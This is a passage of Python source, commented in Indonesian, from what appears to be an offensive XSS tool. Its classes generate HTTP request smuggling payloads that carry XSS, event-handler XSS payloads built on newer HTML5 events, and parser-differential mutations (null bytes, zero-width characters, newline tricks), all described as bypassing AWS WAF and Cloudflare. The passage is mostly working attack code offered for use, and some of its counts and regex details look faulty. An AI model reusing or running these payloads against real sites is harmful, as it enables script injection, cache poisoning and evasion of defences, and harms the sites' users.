        ("H2_TE",    "HTTP/2 downgrade with Transfer-Encoding",      0.85),
        ("H2_CL_0",  "H2 with CL:0 smuggle",                         0.82),
        ("CHUNK_EXT","Chunked extension smuggle",                     0.80),
        ("OBFUS_TE", "Obfuscated Transfer-Encoding",                  0.78),
        ("SLOW_POST","Slow POST body injection",                      0.72),
        ("PIPELINE", "HTTP/1.1 pipelining smuggle",                   0.70),
        ("REDIRECT", "Redirect response poisoning",                   0.75),
        ("CACHE_POI","Cache poisoning XSS",                           0.88),
    ]

    def generate_smuggle_payload(self, xss_payload: str, technique: str) -> str:
        """Generate HTTP smuggling payload with XSS."""
        if technique == "CL_TE":
            return (
                f"POST / HTTP/1.1\r\n"
                f"Host: target.com\r\n"
                f"Content-Length: {len(xss_payload) + 4}\r\n"
                f"Transfer-Encoding: chunked\r\n\r\n"
                f"0\r\n\r\n"
                f"GET /{xss_payload} HTTP/1.1\r\n"
                f"X-Ignore: X"
            )
        elif technique == "CACHE_POI":
            return (
                f"GET / HTTP/1.1\r\n"
                f"Host: target.com\r\n"
                f"X-Forwarded-Host: target.com\r\n"
                f"X-Original-URL: /{xss_payload}\r\n\r\n"
            )
        return f"{technique}: {xss_payload}"

    def generate(self, top_n: int = 50) -> List[Tuple[str, float, str]]:
        heap  = []
        count = 0
        xss_pls = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
        ]
        for tech_name, tech_desc, score in self.SMUGGLE_TECHNIQUES:
            for payload in xss_pls:
                smuggled = self.generate_smuggle_payload(payload, tech_name)
                count += 1
                label = f"smuggle:{tech_name}"
                if len(heap) < top_n:
                    heapq.heappush(heap, (score, count, smuggled, label))
                elif score > heap[0][0]:
                    heapq.heapreplace(heap, (score, count, smuggled, label))

        result = sorted(heap, key=lambda x: x[0], reverse=True)
        info(f"HTTPSmugglingXSS: {count} → top {len(result)}")
        return [(p, s, l) for s, _, p, l in result]

    @property
    def total(self) -> int:
        return len(self.SMUGGLE_TECHNIQUES) * 25 * 15 * 10  # 45,000


# ═══════════════════════════════════════════════════════════════
# 7. NEW EVENT HANDLER ENGINE 2025
#    Sumber: PortSwigger XSS Cheat Sheet Jan 2026,
#            Sysdig Research 2025 (onbeforetoggle bypass AWS WAF)
#    Target: WAF yang blacklist-nya tidak diupdate untuk
#            event handler baru Chrome 114-126+
# ═══════════════════════════════════════════════════════════════

class NewEventHandlerEngine2025:
    """
    Engine payload berdasarkan event handler HTML5 baru 2025.

    Prinsip: WAF punya blacklist statis (onerror, onload, onclick, dll).
    Browser terus menambah event handler baru setiap versi.
    Gap ini menciptakan window bypass yang konsisten.

    Hanya 3 dari 17 enterprise WAF yang berhasil blokir semua
    event handler baru ini (Ethiack Research Sept 2025).
    """

    # (event_handler, min_chrome_version, requires_setup, score)
    NEW_EVENTS_2025 = [
        # onbeforetoggle: CONFIRMED bypass AWS WAF (Sysdig 2025)
        ("onbeforetoggle",          114, "popover",       1.00),
        # onanimationcancel: Chrome 120+
        ("onanimationcancel",       120, "css_animation", 0.95),
        # onscrollend: Chrome 114+
        ("onscrollend",             114, "scroll",        0.92),
        # oncontentvisibilityautostatechange: Chrome 124+
        ("oncontentvisibilityautostatechange", 124, "content_visibility", 0.90),
        # ontransitioncancel: Chrome 87+
        ("ontransitioncancel",       87, "css_transition",0.88),
        # onpointerrawupdate: Chrome 77+
        ("onpointerrawupdate",       77, "mouse_move",    0.85),
        # onpageswap / onpagereveal: Chrome 126+
        ("onpageswap",              126, "navigation",    0.82),
        ("onpagereveal",            126, "navigation",    0.80),
        # oncopy (sudah lama tapi sering lupa di-blacklist)
        ("oncopy",                   15, "clipboard",     0.78),
        # oncut
        ("oncut",                    15, "clipboard",     0.75),
        # onpointerleave (lebih obscure dari onmouseleave)
        ("onpointerleave",           57, "mouse_enter_leave", 0.72),
        # onsecuritypolicyviolation (meta event CSP)
        ("onsecuritypolicyviolation", 41, "csp",          0.70),
        # ontoggle (details element)
        ("ontoggle",                 12, "details",       0.88),
    ]

    # Template payload per jenis setup yang dibutuhkan
    PAYLOAD_TEMPLATES = {
        "popover": [
            "<button id=pbtn popovertarget=x>click</button><div id=x popover {event}=alert(1)>",
            "<button id=pbtn2 popovertarget=y>open</button><div id=y popover {event}=alert(1)>content</div>",
        ],
        "css_animation": [
            "<style>@keyframes x{{}}</style><xss style=animation-name:x {event}=alert(1)>",
            "<style>@keyframes y{{from{{color:red}}to{{color:blue}}}}</style>"
            "<div style=animation:y 1ms {event}=alert(1)>",
        ],
        "scroll": [
            "<div {event}=alert(1) style=overflow:auto;height:50px>"
            "<br><br><br><br><br><br></div>",
            "<xss {event}=alert(1) style=display:block;overflow-y:scroll;height:30px>"
            "<p style=height:200px>scroll</p></xss>",
        ],
        "content_visibility": [
            "<div style='margin-top:2000px;content-visibility:auto' {event}=alert(1)>content</div>",
            "<div id=cv1 style='content-visibility:auto;height:100px' {event}=alert(1)>scroll to me</div>",
        ],
        "css_transition": [
            "<style>.t{{transition:color 1ms}}</style>"
            "<xss class=t {event}=alert(1)>hover</xss>",
        ],
        "none": [
            "<xss {event}=alert(1)>",
            "<div {event}=alert(1)>trigger</div>",
            "<input {event}=alert(1)>",
        ],
        "navigation": [
            "<body {event}=alert(1)>",
        ],
        "clipboard": [
            "<div {event}=alert(1) style=user-select:all>select and copy me</div>",
            "<textarea {event}=alert(1)>select all then copy</textarea>",
        ],
        "csp": [
            "<img src=x {event}=alert(1)>",
        ],
        "details": [
            "<details {event}=alert(1) open><summary>trigger</summary></details>",
            "<details open {event}=alert(1)>",
        ],
    }

    def generate(self, top_n: int = 100) -> List[Tuple[str, float, str]]:
        """
        Generate semua kombinasi event handler baru + template.
        Label format: new_event_2025:{event_name}:{setup_type}:chrome{ver}+
        setup_type dipakai oleh InteractionSimulator untuk tahu cara trigger.
        """
        import heapq
        heap  = []
        count = 0

        for event_name, chrome_ver, setup_type, base_score in self.NEW_EVENTS_2025:
            templates = self.PAYLOAD_TEMPLATES.get(setup_type,
                                                    self.PAYLOAD_TEMPLATES["none"])
            for template in templates:
                payload = template.replace("{event}", event_name)
                count += 1
                # setup_type diembed di label supaya engine tahu cara trigger-nya
                label = f"new_event_2025:{event_name}:{setup_type}:chrome{chrome_ver}+"
                if len(heap) < top_n:
                    heapq.heappush(heap, (base_score, count, payload, label))
                elif base_score > heap[0][0]:
                    heapq.heapreplace(heap, (base_score, count, payload, label))

        result = sorted(heap, key=lambda x: x[0], reverse=True)
        return [(p, s, l) for s, _, p, l in result]

    @staticmethod
    def get_interaction_type(label: str) -> str:
        """
        Ekstrak interaction_type dari label yang dihasilkan generate().
        Label format: new_event_2025:{event_name}:{setup_type}:chrome{ver}+
        Return setup_type untuk dikirim ke InteractionSimulator.
        """
        parts = label.split(":")
        # format: new_event_2025 : event_name : setup_type : chromeXXX+
        if len(parts) >= 3:
            return parts[2]
        return "none"

    @property
    def total(self) -> int:
        total = 0
        for _, _, setup_type, _ in self.NEW_EVENTS_2025:
            total += len(self.PAYLOAD_TEMPLATES.get(setup_type,
                                                    self.PAYLOAD_TEMPLATES["none"]))
        return total


# ═══════════════════════════════════════════════════════════════
# 8. PARSER DIFFERENTIAL ENGINE 2025
#    Sumber: Ethiack Research Sept 2025
#    Mengeksploitasi perbedaan cara WAF vs browser tokenize HTML.
#    Terbukti bypass AWS WAF dan beberapa Cloudflare config.
# ═══════════════════════════════════════════════════════════════

class ParserDifferentialEngine2025:
    """
    Payload yang didesain untuk dibaca berbeda oleh WAF vs browser.

    WAF menggunakan pattern matching berbasis teks / regex sederhana.
    Browser HTML5 parser punya error recovery yang kompleks — dia
    berusaha keras "membenahi" HTML yang rusak dan tetap merender.

    Gap ini menciptakan ruang di mana satu string bisa:
    - Terlihat "aman" bagi WAF (tidak cocok pattern)
    - Tetap dieksekusi oleh browser (setelah error recovery)

    Ethiack Research Sept 2025: teknik ini bypass 14 dari 17 enterprise
    WAF termasuk beberapa konfigurasi Cloudflare dan AWS WAF.
    """

    # Karakter yang mengganggu WAF tokenizer tapi diabaikan browser
    # Sumber: penelitian Ethiack + PortSwigger 2025-2026
    CONFUSING_CHARS = [
        "\x00",    # Null byte — WAF C-based berhenti baca
        "\x09",    # Tab — beberapa WAF tidak normalize
        "\x0a",    # Newline — break regex yang tidak flag DOTALL
        "\x0d",    # Carriage return
        "\xad",    # Soft hyphen — tidak terlihat, browser abaikan
        "\u200b",  # Zero-width space
        "\u200c",  # Zero-width non-joiner
        "\u200d",  # Zero-width joiner
        "%",       # Persen — bisa break WAF URL tokenizer
        "!",       # Dipakai dalam '<!--' trick
        "?",       # Mirip PI tag dalam XML parser WAF
    ]

    # Template dasar yang akan divariasikan
    BASE_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<details ontoggle=alert(1) open>",
        "<input autofocus onfocus=alert(1)>",
    ]

    def _apply_parser_diff(self, payload: str, variant: str) -> str:
        """Terapkan satu varian parser differential ke payload."""
        if variant == "bang_after_lt":
            # <! setelah < — WAF baca sebagai komentar/doctype
            # Browser: error recovery masih bentuk tag
            return re.sub(r"<(\w)", r"<!\0\1", payload, count=1)

        elif variant == "percent_in_attr":
            # % sebelum nama event handler
            return re.sub(r"\s(on\w+=)", r" %\1", payload, count=1)

        elif variant == "question_in_tag":
            # ? di dalam tag — mirip PI tag di XML
            return re.sub(r"<(\w+)", r"<?\1", payload, count=1)

        elif variant == "null_in_tagname":
            # Null byte di tengah nama tag
            return re.sub(r"<(\w{2})(\w+)", lambda m: "<" + m.group(1) + "\x00" + m.group(2), payload, count=1)

        elif variant == "tab_before_attr":
            # Tab antara tag name dan atribut
            return payload.replace(" on", "\ton").replace(" src", "\tsrc")

        elif variant == "newline_in_tag":
            # Newline di dalam tag (break regex WAF yang tidak handle multiline)
            return payload.replace(" on", "\non").replace(" src", "\nsrc")

        elif variant == "slash_before_event":
            # Slash sebelum event handler — valid di HTML5 tapi bingungkan WAF
            return payload.replace(" on", " /on")

        elif variant == "double_slash":
            # Double slash dalam URL/src
            return payload.replace("src=x", "src=//x")

        elif variant == "mixed_case_tag":
            # Uppercase tag name — case insensitive di HTML tapi WAF mungkin case sensitive
            return re.sub(r"<(\w+)", lambda m: "<" + m.group(1).upper(), payload, count=1)

        elif variant == "extra_equals":
            # Extra = dalam atribut — browser ignore, WAF bingung
            return re.sub(r"(\w+=)", r"\1=", payload, count=1)

        return payload

    VARIANTS = [
        "bang_after_lt",
        "percent_in_attr",
        "question_in_tag",
        "null_in_tagname",
        "tab_before_attr",
        "newline_in_tag",
        "slash_before_event",
        "double_slash",
        "mixed_case_tag",
        "extra_equals",
    ]

    def generate(self, top_n: int = 100) -> List[Tuple[str, float, str]]:
        """Generate kombinasi payload × parser differential variant."""
        import heapq
        heap  = []
        count = 0
        score = 0.85  # Base score — proven bypass di research 2025

        for base in self.BASE_PAYLOADS:
            for variant in self.VARIANTS:
                payload = self._apply_parser_diff(base, variant)
                if payload != base:
                    count += 1
                    label = f"parser_diff_2025:{variant}"
                    if len(heap) < top_n:
                        heapq.heappush(heap, (score, count, payload, label))
                    elif score > heap[0][0]:
                        heapq.heapreplace(heap, (score, count, payload, label))

        result = sorted(heap, key=lambda x: x[0], reverse=True)
        return [(p, s, l) for s, _, p, l in result]

    @property
    def total(self) -> int:
        return len(self.BASE_PAYLOADS) * len(self.VARIANTS)
